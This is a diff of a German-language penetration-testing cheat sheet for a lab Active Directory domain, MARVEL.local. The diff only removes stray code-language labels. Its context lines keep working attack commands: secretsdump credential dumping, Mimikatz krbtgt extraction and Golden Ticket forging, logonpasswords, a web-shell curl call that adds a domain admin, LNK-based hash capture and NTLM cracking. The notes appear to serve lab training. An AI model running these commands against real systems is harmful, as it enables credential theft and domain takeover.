@@ -37,7 +37,6 @@ impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x -just-dc-ntl
 
 ### Golden Ticket Erstellung (Windows/Mimikatz)
 
-cmd
 
 ```cmd
 # Mimikatz starten
@@ -49,7 +48,6 @@ privilege::debug
 
 **Erwartete Ausgabe:** `Privilege '20' OK`
 
-mimikatz
 
 ```mimikatz
 # Kerberos Ticket Informationen extrahieren
@@ -61,7 +59,6 @@ lsadump::lsa /inject /name:krbtgt
 - Domain SID (z.B. `S-1-5-21-...`)
 - NTLM Hash des krbtgt Accounts
 
-mimikatz
 
 ```mimikatz
 # Golden Ticket erstellen (Generisches Template)
@@ -107,7 +104,6 @@ curl "http://10.10.255.70/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/ad
 curl "http://10.10.255.70/dev/back.php?c=net%20localgroup%20Administrators%20harry%20/add%20/domain"
 ```
 
-cmd
 
 ```cmd
 # Via Command Shell (Windows)
@@ -120,7 +116,6 @@ net group "Domänen-Admins" hawkeye /ADD /DOMAIN
 
 ### Via Evil-WinRM
 
-cmd
 
 ```cmd
 # In Evil-WinRM Session
@@ -196,7 +191,6 @@ whoami   # Should show MARVEL\Administrator
 
 ### Domain Compromise via Token
 
-cmd
 
 ```cmd
 # In impersonated Administrator Shell
@@ -292,7 +286,6 @@ impacket-smbexec MARVEL.local/hawkeye:'Password1@'@192.168.xx.x
 
 ### PowerShell LNK Creation
 
-powershell
 
 ```powershell
 powershell
@@ -308,7 +301,6 @@ $lnk.Save()
 
 ### Trigger Hash Capture
 
-cmd
 
 ````cmd
 # LNK File ausführen
@@ -363,7 +355,6 @@ impacket-smbexec MARVEL.local/jdoe:Password1@192.168.xx.x
 
 ### File Transfer Verification
 
-cmd
 
 ```cmd
 dir C:\Windows\Temp\mimi*.*
@@ -371,7 +362,6 @@ dir C:\Windows\Temp\mimi*.*
 
 ### Mimikatz Execution
 
-cmd
 
 ```cmd
 # Interactive Mimikatz
@@ -380,7 +370,6 @@ C:\Windows\Temp\mimikatz.exe
 
 **In Mimikatz Prompt:**
 
-mimikatz
 
 ```mimikatz
 privilege::debug
@@ -389,7 +378,6 @@ sekurlsa::logonpasswords
 
 ### Direct Execution Alternative
 
-cmd
 
 ```cmd
 C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
@@ -569,7 +557,6 @@ telnet 127.0.0.1 11000
 
 **Interactive Commands:**
 
-smb
 
 ```smb
 help
@@ -722,7 +709,6 @@ hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
 
 ### Domain User Creation Issues
 
-cmd
 
 ```cmd
 # Wenn User Creation fehlschlägt:
@@ -784,7 +770,6 @@ openssl s_client -connect 192.168.57.14:636
 
 ### Backdoor User entfernen
 
-cmd
 
 ```cmd
 # Domain User löschen
@@ -794,7 +779,6 @@ net user hawkeye /delete /domain
 
 ### LNK Files entfernen
 
-cmd
 
 ```cmd
 # Malicious LNK Files löschen
